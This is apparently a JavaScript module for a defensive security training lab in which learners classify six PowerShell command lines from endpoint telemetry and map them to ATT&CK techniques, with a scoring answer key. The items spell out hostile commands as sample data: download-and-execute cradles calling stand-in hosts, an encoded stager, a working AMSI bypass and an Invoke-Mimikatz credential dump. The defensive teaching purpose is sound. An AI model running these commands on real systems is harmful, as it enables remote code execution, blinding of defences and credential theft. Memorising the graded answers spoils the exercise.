window.CP = window.CP || {};
CP.labs = CP.labs || [];
CP.labs.push({
  id: "lab-powershell-triage",
  title: "PowerShell Triage: Benign, Suspicious or Malicious?",
  module: "p2-m5",
  difficulty: "Intermediate",
  minutes: 35,
  skills: ["PowerShell analysis", "EDR telemetry", "Base64 decoding", "download cradles", "AMSI bypass", "MITRE ATT&CK mapping"],
  briefing: `
    <p><b>Scenario:</b> Your EDR surfaced six PowerShell command lines captured from <code>Microsoft-Windows-PowerShell/Operational</code>
    (Event ID 4104 script-block logging) and Sysmon process creation across several hosts in the last hour. Not everything PowerShell does is
    evil - IT automation uses it constantly. Your job is to <b>triage</b> each command line, decode anything obfuscated, classify it, and map it to
    an ATT&CK technique.</p>
    <p><b>Objectives:</b></p>
    <ul>
      <li>For each command, decide <b>Benign</b>, <b>Suspicious</b> or <b>Malicious</b> and pick the best ATT&CK technique.</li>
      <li>Use the <b>Decode Base64 (UTF-16LE)</b> button on <code>-EncodedCommand</code> payloads - PowerShell encodes in UTF-16LE then Base64.</li>
      <li>Justify each call the way you would in a ticket.</li>
    </ul>
    <div class="callout tip"><b>Red flags:</b> <code>-enc</code>/<code>-EncodedCommand</code>, <code>-w hidden</code>, <code>-nop</code>,
    <code>IEX</code>/<code>Invoke-Expression</code> of downloaded content ("download cradle"), <code>DownloadString</code>/<code>DownloadFile</code>,
    <code>[Ref].Assembly...amsiInitFailed</code> (AMSI bypass), <code>FromBase64String</code>, <code>-ExecutionPolicy Bypass</code> alone is weak evidence.</div>
    <div class="callout exam">Encoding is <i>defense evasion/obfuscation</i> (T1027 / T1059.001), a download-and-run is <i>ingress tool transfer</i> (T1105),
    AMSI tampering is <i>impair defenses</i> (T1562.001), and LSASS/credential tools are <i>OS credential dumping</i> (T1003).</div>
  `,
  render(container, ctx) {
    const esc = ctx.escape;
    container.classList.add("lab-lab-powershell-triage");

    function b64utf16(str) {
      let bin = "";
      for (let i = 0; i < str.length; i++) { const c = str.charCodeAt(i); bin += String.fromCharCode(c & 255, c >> 8); }
      return btoa(bin);
    }
    function decodeUtf16le(b64) {
      let bin;
      try { bin = atob(b64.trim()); } catch (e) { return { error: "Not valid Base64." }; }
      if (bin.length % 2 !== 0) return { error: "Length is odd - this may not be UTF-16LE encoded." };
      let out = "";
      for (let i = 0; i < bin.length; i += 2) out += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i + 1) << 8));
      return { text: out };
    }

    const ENC_PAYLOAD = "IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync-api.example/stage2.ps1'); Invoke-ADEnum -Recon";
    const ENC = b64utf16(ENC_PAYLOAD);
    const TECHS = [
      ["", "- choose technique -"],
      ["T1059.001", "T1059.001 - Command & Scripting: PowerShell"],
      ["T1027", "T1027 - Obfuscated/Encoded Files or Information"],
      ["T1105", "T1105 - Ingress Tool Transfer (download cradle)"],
      ["T1562.001", "T1562.001 - Impair Defenses: Disable/Modify Tools (AMSI)"],
      ["T1003.001", "T1003.001 - OS Credential Dumping: LSASS Memory"],
      ["T1053.005", "T1053.005 - Scheduled Task/Job: Scheduled Task"],
      ["T1218", "T1218 - Signed Binary Proxy Execution"],
      ["none", "None / benign administration"]
    ];

    const ITEMS = [
      { host: "WS-IT-01", user: "adm.rsingh", parent: "powershell_ise.exe",
        cmd: "Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)} | Export-Csv C:\\IT\\stale_users.csv -NoTypeInformation",
        cls: "benign", tech: "none",
        why: "Routine Active Directory hygiene by an admin account from the ISE: find enabled users who have not logged in for 90 days and export to CSV. No encoding, no download, no evasion. Legitimate admin use of PowerShell is extremely common - context (who, where, what) is what distinguishes it." },
      { host: "WS-ENG-11", user: "tbrooks", parent: "WINWORD.EXE",
        cmd: "powershell.exe -nop -w hidden -enc " + ENC,
        enc: ENC, cls: "malicious", tech: "T1059.001",
        why: "Encoded + hidden window + no profile, and the parent is Word. Decoding the Base64 (UTF-16LE) reveals a download cradle (IEX DownloadString of stage2.ps1) and AD reconnaissance. Office spawning hidden encoded PowerShell is a near-certain malicious macro (T1566.001 -> T1059.001; the payload itself is also T1105)." },
      { host: "FS-01", user: "svc_deploy", parent: "cmd.exe",
        cmd: "powershell -ExecutionPolicy Bypass -File \\\\FS-01\\deploy$\\scripts\\Install-Agent.ps1 -Version 4.2.1",
        cls: "suspicious", tech: "none",
        why: "ExecutionPolicy Bypass looks alarming but is routine for scripts run from a share, and this is a named deployment script run by a deploy service account from an internal UNC path. Classify Suspicious (verify the script and that this deployment was scheduled) rather than Malicious - ExecutionPolicy is not a security boundary and its use alone is weak evidence." },
      { host: "WS-FIN-07", user: "dmorgan", parent: "powershell.exe",
        cmd: "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.244:8080/a')",
        cls: "malicious", tech: "T1105",
        why: "A textbook download cradle: fetch a script from a raw IP over HTTP and Invoke-Expression it straight into memory - no file touches disk. This is how most PowerShell stagers (Empire, Sliver, Metasploit web_delivery) pull their next stage (T1105 Ingress Tool Transfer / T1059.001)." },
      { host: "WS-SALES-05", user: "jortiz", parent: "excel.exe",
        cmd: "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
        cls: "malicious", tech: "T1562.001",
        why: "This is the classic AMSI bypass: it flips the private amsiInitFailed field to $true so the Antimalware Scan Interface stops inspecting later script content. There is no legitimate reason to tamper with AMSI - it exists only to blind the defender before running something else (T1562.001 Impair Defenses)." },
      { host: "WS-ENG-14", user: "mali", parent: "powershell.exe",
        cmd: "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.example/x/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
        cls: "malicious", tech: "T1003.001",
        why: "Downloads and runs Invoke-Mimikatz, then calls -DumpCreds to extract credentials from LSASS memory. Mimikatz in any form is credential theft (T1003.001 LSASS Memory). The download cradle (T1105) is the delivery; the intent and primary technique is credential dumping." }
    ];

    const CLS = [["benign", "Benign", "good"], ["suspicious", "Suspicious", "warn"], ["malicious", "Malicious", "bad"]];

    const style = document.createElement("style");
    style.textContent = `
      .lab-lab-powershell-triage .pt-cmd { background: var(--code-bg); border-radius:6px; padding:10px; font-size:.82em; white-space:pre-wrap; word-break:break-all; margin:8px 0; }
      .lab-lab-powershell-triage .pt-head { display:flex; gap:10px; flex-wrap:wrap; font-size:.85em; align-items:center; }
      .lab-lab-powershell-triage .pt-controls { display:flex; gap:10px; flex-wrap:wrap; align-items:center; }
      .lab-lab-powershell-triage .pt-cls label { margin-right:10px; cursor:pointer; }
      .lab-lab-powershell-triage .pt-decoded { background: color-mix(in srgb, var(--accent) 12%, transparent); border:1px dashed var(--accent); border-radius:6px; padding:8px; font-size:.82em; white-space:pre-wrap; word-break:break-all; margin:6px 0; }
      .lab-lab-powershell-triage .pt-fb { margin-top:8px; font-size:.9em; }
      .lab-lab-powershell-triage .pt-card { padding:12px 14px; }
    `;
    container.appendChild(style);

    const wrap = document.createElement("div");
    wrap.className = "stack";
    container.appendChild(wrap);

    ITEMS.forEach((it, i) => {
      const card = document.createElement("div");
      card.className = "card pt-card stack";
      card.innerHTML = `
        <div class="pt-head"><b>Command ${i + 1}</b>
          <span class="tag">host: ${esc(it.host)}</span>
          <span class="tag">user: ${esc(it.user)}</span>
          <span class="tag ${it.parent === "WINWORD.EXE" || it.parent === "excel.exe" ? "bad" : ""}">parent: ${esc(it.parent)}</span>
        </div>
        <div class="pt-cmd mono">${esc(it.cmd)}</div>
        ${it.enc ? `<div><button class="btn ghost" type="button" data-decode="${i}">Decode Base64 (UTF-16LE)</button></div><div class="pt-decoded mono" data-dec="${i}" hidden></div>` : ""}
        <div class="pt-controls">
          <div class="pt-cls">${CLS.map((c) => `<label><input type="radio" name="pt-cls-${i}" value="${c[0]}"> <span class="tag ${c[2]}">${c[1]}</span></label>`).join("")}</div>
          <select class="select" data-tech="${i}" style="min-width:240px" aria-label="ATT&CK technique for command ${i + 1}">${TECHS.map((t) => `<option value="${t[0]}">${esc(t[1])}</option>`).join("")}</select>
        </div>
        <div class="pt-fb" data-fb="${i}"></div>`;
      wrap.appendChild(card);
    });

    wrap.addEventListener("click", (e) => {
      const b = e.target.closest("[data-decode]");
      if (!b) return;
      const i = +b.dataset.decode, el = wrap.querySelector(`[data-dec="${i}"]`);
      if (!el.hidden) { el.hidden = true; b.textContent = "Decode Base64 (UTF-16LE)"; return; }
      const r = decodeUtf16le(ITEMS[i].enc);
      el.hidden = false;
      el.textContent = r.error ? "Decode error: " + r.error : "Decoded payload:\n" + r.text;
      b.textContent = "Hide decoded";
    });

    const bar = document.createElement("div");
    bar.className = "row";
    bar.innerHTML = `<button class="btn primary" data-el="check" type="button">Submit triage</button><span class="muted" data-el="prog"></span>`;
    wrap.appendChild(bar);
    const result = document.createElement("div");
    wrap.appendChild(result);

    const prog = () => { const n = ITEMS.filter((_, i) => wrap.querySelector(`input[name="pt-cls-${i}"]:checked`) && wrap.querySelector(`[data-tech="${i}"]`).value).length; container.querySelector('[data-el="prog"]').textContent = `${n}/${ITEMS.length} fully triaged`; };
    wrap.addEventListener("change", prog); prog();

    let done = false;
    container.querySelector('[data-el="check"]').addEventListener("click", () => {
      let points = 0, answered = 0;
      ITEMS.forEach((it, i) => {
        const cR = wrap.querySelector(`input[name="pt-cls-${i}"]:checked`);
        const tR = wrap.querySelector(`[data-tech="${i}"]`).value;
        const fb = wrap.querySelector(`[data-fb="${i}"]`);
        if (!cR || !tR) { fb.innerHTML = `<span class="tag warn">pick a classification and a technique</span>`; return; }
        answered++;
        const clsOk = cR.value === it.cls;
        const techOk = tR === it.tech;
        if (clsOk) points += 0.6;
        if (techOk) points += 0.4;
        const label = CLS.find((c) => c[0] === it.cls);
        fb.innerHTML = `<span class="tag ${clsOk ? "good" : "bad"}">classification ${clsOk ? "correct" : "- should be " + label[1]}</span>
          <span class="tag ${techOk ? "good" : "bad"}">technique ${techOk ? "correct" : "- " + esc(TECHS.find((t) => t[0] === it.tech)[1])}</span>
          <div class="muted" style="margin-top:4px">${esc(it.why)}</div>`;
      });
      if (answered < ITEMS.length) { result.innerHTML = `<div class="alert info">Triage all ${ITEMS.length} commands (classification + technique) to finish.</div>`; return; }
      const score = Math.round(points / ITEMS.length * 100);
      result.innerHTML = `<div class="alert ${score >= 70 ? "good" : "bad"}"><b>Score: ${score}%</b>
        (classification worth 60%, technique 40% per command).
        <div style="margin-top:6px">Takeaway: PowerShell itself is neutral. Triage on <b>behaviour and context</b> - encoding, hidden windows, download cradles,
        AMSI tampering and credential tools are malicious regardless of who ran them, while ExecutionPolicy Bypass or a UNC-path script needs verification,
        not an automatic incident. Commands 1 was benign and 3 was suspicious-pending-verification; the rest were malicious.</div></div>`;
      if (!done) { done = true; ctx.complete(score); }
    });

    container._cpDecode = decodeUtf16le;
    container._cpExpected = ITEMS.map((it) => ({ cls: it.cls, tech: it.tech }));
  }
});
